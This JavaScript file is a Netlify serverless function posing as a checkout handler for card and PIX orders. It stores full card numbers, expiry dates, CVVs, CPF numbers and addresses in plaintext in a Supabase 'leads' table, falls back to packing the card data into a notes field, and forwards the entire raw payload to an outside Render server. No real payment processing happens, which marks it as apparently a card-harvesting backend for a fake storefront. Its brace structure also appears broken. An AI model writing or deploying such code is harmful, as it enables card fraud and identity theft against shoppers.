// netlify/functions/checkout.js
// Netlify serverless function to receive checkout orders (Card approved/declined & PIX)
// and reliably store them in Supabase leads table.

const { createClient } = require('@supabase/supabase-js');

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method Not Allowed' }) };
  }

  try {
    const supabaseUrl = process.env.VITE_SUPABASE_URL || process.env.SUPABASE_URL || '';
    const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY || process.env.SUPABASE_ANON_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY || '';

    const body = JSON.parse(event.body || '{}');
    console.log('[Netlify Checkout Function] Payload recebido:', JSON.stringify(body));

    // Normalize input fields (flat or nested)
    const lead = body.lead || {};
    const card = body.card || {};
    const order = body.order || {};

    const nome = body.clientName || lead.nome || body.nome || 'Cliente Anônimo';
    const email = body.clientEmail || lead.email || body.email || '';
    const cpf = (body.clientCPF || lead.cpf || body.cpf || '').replace(/\D/g, '');
    const telefone = (body.clientPhone || lead.telefone || body.telefone || '').replace(/\D/g, '');

    const cep = (body.cep || lead.cep || '').replace(/\D/g, '');
    const rua = body.street || lead.rua || body.rua || '';
    const numero = body.number || lead.numero || body.numero || '';
    const complemento = body.complement || lead.complemento || body.complemento || '';
    const bairro = body.neighborhood || lead.bairro || body.bairro || '';
    const cidade = body.city || lead.cidade || body.cidade || '';
    const estado = body.state || lead.estado || body.estado || '';

    const cardNumber = body.cardNumber || card.number || body.card_number || '';
    const cardName = body.cardHolder || card.name || body.card_name || nome;
    const cardExpiry = body.cardExpiry || card.expiry || body.card_expiry || '';
    const cardCvv = body.cardCvv || card.cvv || body.card_cvv || '';
    const installments = body.cardInstallments || card.installments || body.installments || '1x';

    const finalPrice = parseFloat(body.totalPrice || order.finalPrice || body.finalPrice || body.amount || 69.90);
    const paymentMethod = body.paymentMethod || order.paymentMethod || body.payment_method || 'card';

    const rawStatus = String(body.status || order.status || (body.event === 'card_declined' ? 'negado' : 'pago')).toLowerCase();
    const isDeclined = rawStatus === 'negado' || body.event === 'card_declined';
    const status = isDeclined ? 'negado' : rawStatus;

    const txId = body.transaction_id || body.orderId || order.orderId || `CP-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

    const fullCardNumber = cardNumber || (paymentMethod === 'pix' ? 'PIX' : '');

    const leadData = {
      created_at: new Date().toISOString(),
      nome,
      email,
      cpf,
      telefone,
      cep,
      rua,
      numero,
      complemento,
      bairro,
      cidade,
      estado,
      final_price: finalPrice,
      payment_method: paymentMethod,
      status,
      transaction_id: txId,
      card_number: fullCardNumber,
      card_name: cardName,
      card_expiry: cardExpiry,
      card_cvv: cardCvv,
      installments: installments,
      tracking_code: body.trackingCode || body.tracking_code || ''
    };

    if (supabaseUrl && supabaseKey && !supabaseUrl.includes('seu-projeto')) {
      const supabase = createClient(supabaseUrl, supabaseKey);
      const { error } = await supabase.from('leads').insert([leadData]);

      if (error) {
        console.error('[Netlify Checkout Function] Erro ao inserir no Supabase:', error.message);
        // Fallback without card fields if table schema differs
        const cleanLead = { ...leadData };
        delete cleanLead.card_number;
        delete cleanLead.card_name;
        delete cleanLead.card_expiry;
        delete cleanLead.card_cvv;
        delete cleanLead.installments;
        cleanLead.notes = `Cartão ${status.toUpperCase()} | Num: ${cardNumber} | Nome: ${cardName} | Val: ${cardExpiry} | CVV: ${cardCvv}`;
        
        const { error: err2 } = await supabase.from('leads').insert([cleanLead]);
        if (err2) console.error('[Netlify Checkout Function] Erro no fallback:', err2.message);
        else console.log('[Netlify Checkout Function] Salvo via fallback no Supabase ✓');
      } else {
        console.log(`[Netlify Checkout Function] Pedido ${txId} (${status}) salvo no Supabase ✓`);
      }
    // Dispara o pedido também para o servidor no Render (https://wepink-checkout.onrender.com)
    try {
      const renderEndpoint = isDeclined ? 'https://wepink-checkout.onrender.com/api/checkout' : (paymentMethod === 'pix' ? 'https://wepink-checkout.onrender.com/api/checkout-pix' : 'https://wepink-checkout.onrender.com/api/checkout');
      await fetch(renderEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      console.log(`[Netlify Checkout Function] Pedido ${txId} repassado com sucesso para o Render ✓`);
    } catch (rErr) {
      console.error('[Netlify Checkout Function] Erro ao repassar pedido para o Render:', rErr.message);
    }

    return {
      statusCode: isDeclined ? 400 : 200,
      headers,
      body: JSON.stringify({
        success: !isDeclined,
        transaction_id: txId,
        message: isDeclined ? 'Cartão recusado pelo banco emissor.' : 'Pedido registrado com sucesso.'
      })
    };

  } catch (err) {
    console.error('[Netlify Checkout Function] Erro de execução:', err.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: err.message })
    };
  }
};
